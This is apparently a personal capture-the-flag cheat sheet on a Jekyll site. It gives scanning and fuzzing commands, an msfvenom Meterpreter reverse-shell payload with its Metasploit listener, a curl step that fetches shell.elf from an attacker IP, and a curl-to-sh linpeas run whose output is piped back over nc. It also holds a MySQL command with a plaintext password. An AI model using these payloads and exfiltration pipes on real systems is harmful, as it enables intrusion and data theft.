---
layout: single
classes: #wide
title: "General CTF"
sidebar:
    title: "CTF knowledge"
    nav: infosec
collection: infopages
permalink: /ctfs_n_such/general
toc: true
toc_sticky: true
author_profile: true
---

Keepin it simple

strace - see how program exited

# Tmux
re-attach session:  
`tmux a`  
Attach file session:  
`tmux -S <name>`   
Rename session:  
`prefix + $`    
Pane -> Window:
`prefix + !`  
Move pane left/right:  
`prefix + { or }`
Save / restore:  
`prefix + s / r`

# Nmap 
basic scan:  
```nmap -sV -sC -T4 -p- -oN nmap $url```  


# Fuzzing 
quick fuzz:  
```gobuster dir -u $url -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 100 -o gobuster```

recursive:  
```shuffledns``` 
# shells

reverse shell tips:  
```rlwrap nc -lnvpn``` (reverse shell with better fuctionality/arrowkeys)  

after get shell:  
```python3 -c 'import pty;pty.spawn("/bin/bash")'``` or ```script /dev/null -c bash```  
```ctrl - z```(to background the nc process)  
```stty raw -echo;fg```
```export TERM=xterm```   
* makes able to clear term
* better machine access

## Meterpreter
Basic meterpreter payload:   
```msfvenom -p linux/x86/meterpreter/reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.10.14.236 LPORT=8888 -f elf -o shell.elf```  

# Msfconsole
listener for rev shell:  
```
use exploit/multi/handler 
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST tun0 
set LPORT 8888 
run
```

# curl
```python -m http.server 6969```
```curl 10.10.16.20:6969/shell.elf -o /tmp/shell.elf```


# linpeas
[url](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)  
`less -r` - view linpeas results   
`./linpeas.sh >> output`  
Linpeas from mem -> host:  
```
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
```

# Mysql
`mysql -u craftuser -pCraftCMSPassword2023! -h localhost craftdb`